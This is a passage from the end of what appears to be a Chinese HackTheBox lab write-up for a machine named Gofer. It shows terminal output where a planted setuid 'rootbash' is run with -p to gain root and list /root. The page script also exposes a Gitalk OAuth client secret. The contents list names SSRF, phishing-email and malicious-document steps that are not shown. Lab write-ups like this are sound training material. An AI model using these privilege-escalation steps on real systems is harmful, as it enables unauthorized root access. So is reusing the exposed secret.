Aug  5 08:05 .ICE-unix<br>drwx------  3 jhudson  jhudson     4096 Aug  5 11:02 lu5012xuigb9.tmp<br>drwx------  2 jhudson  jhudson     4096 Aug  5 14:36 lu9624y25uma.tmp<br>srwxr-xr-x  1 jhudson  jhudson        0 Aug  5 14:36 OSL_PIPE_1000_SingleOfficeIPC_b31bb423faa33322afe433cf9acd1272<br>-rwsr-sr-x  1 root     root     1234376 Aug  5 15:51 rootbash<br>drwx------  3 root     root        4096 Aug  5 08:05 systemd-private-711ebd4724b24c22b4a90210e66cc476-apache2.service-1K3kih<br>drwx------  3 root     root        4096 Aug  5 08:05 systemd-private-711ebd4724b24c22b4a90210e66cc476-systemd-logind.service-FsKf3f<br>drwx------  3 root     root        4096 Aug  5 08:05 systemd-private-711ebd4724b24c22b4a90210e66cc476-systemd-timesyncd.service-0MAATi<br>-rwxr-xr-x  1 tbuckley tbuckley      52 Aug  5 15:49 tar<br>drwxrwxrwt  2 root     root        4096 Aug  5 08:05 .Test-unix<br>drwx------  2 root     root        4096 Aug  5 08:05 vmware-root_617-4022243191<br>drwxrwxrwt  2 root     root        4096 Aug  5 08:05 .X11-unix<br>drwxrwxrwt  2 root     root        4096 Aug  5 08:05 .XIM-unix<br>tbuckley@gofer:/tmp$ ./rootbash -p<br>rootbash-5.1<span class="hljs-comment"># id</span><br>uid=1002(tbuckley) gid=1002(tbuckley) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),1002(tbuckley),1004(dev)<br>rootbash-5.1<span class="hljs-comment"># whoami</span><br>root<br>rootbash-5.1<span class="hljs-comment"># cd /root</span><br>rootbash-5.1<span class="hljs-comment"># ls -la</span><br>total 80<br>drwx------ 14 root root 4096 Jul 17 16:55 .<br>drwxr-xr-x 18 root root 4096 Jul 19 12:44 ..<br>drwxr-xr-x  2 root root 4096 Apr 28 12:19 backups<br>lrwxrwxrwx  1 root root    9 Nov  3  2022 .bash_history -&gt; /dev/null<br>-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc<br>drwx------  3 root root 4096 Apr 26 23:59 .config<br>drwxr-xr-x  2 root root 4096 Apr 26 23:59 Desktop<br>drwxr-xr-x  2 root root 4096 Apr 26 23:59 Documents<br>drwxr-xr-x  2 root root 4096 Apr 26 23:59 Downloads<br>drwxr-xr-x  3 root root 4096 Oct 28  2022 .<span class="hljs-built_in">local</span><br>drwxr-xr-x  2 root root 4096 Apr 26 23:59 Music<br>drwxr-xr-x  2 root root 4096 Apr 26 23:59 Pictures<br>-rw-r--r--  1 root root  161 Jul  9  2019 .profile<br>drwxr-xr-x  2 root root 4096 Apr 26 23:59 Public<br>-rw-r-----  1 root root   33 Aug  5 08:05 root.txt<br>drwxr-xr-x  2 root root 4096 Jul 27 11:57 scripts<br>drwxr-xr-x  2 root root 4096 Apr 26 23:59 Templates<br>drwxr-xr-x  2 root root 4096 Apr 26 23:59 Videos<br>-rw-r--r--  1 root root   39 Jul 17 16:55 .vimrc<br>-rw-------  1 root root   54 Apr 26 23:59 .Xauthority<br>-rw-------  1 root root 1626 Apr 27 00:16 .xsession-errors<br></code></pre></td></tr></table></figure>

<p>搞定。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/26/Authority/">[HTB]  Authority Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">2.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#whatweb"><span class="toc-number">2.2.</span> <span class="toc-text">whatweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nikto"><span class="toc-number">2.3.</span> <span class="toc-text">nikto</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smb%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">smb渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99"><span class="toc-number">4.1.</span> <span class="toc-text">访问网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">4.2.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8DFUZZ"><span class="toc-number">4.3.</span> <span class="toc-text">子域名FUZZ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proxy"><span class="toc-number">4.4.</span> <span class="toc-text">proxy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E5%88%A9%E7%94%A8"><span class="toc-number">4.5.</span> <span class="toc-text">SSRF利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E6%9E%84%E9%80%A0"><span class="toc-number">4.5.1.</span> <span class="toc-text">钓鱼邮件构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%81%B6%E6%84%8Fodt%E6%96%87%E4%BB%B6%E6%9E%84%E9%80%A0"><span class="toc-number">4.5.2.</span> <span class="toc-text">恶意odt文件构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%AB%8B%E8%B6%B3%E7%82%B9"><span class="toc-number">4.5.3.</span> <span class="toc-text">获取立足点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pspy64%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="toc-number">5.1.</span> <span class="toc-text">pspy64获取信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%86%E5%90%91notes"><span class="toc-number">5.2.</span> <span class="toc-text">逆向notes</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>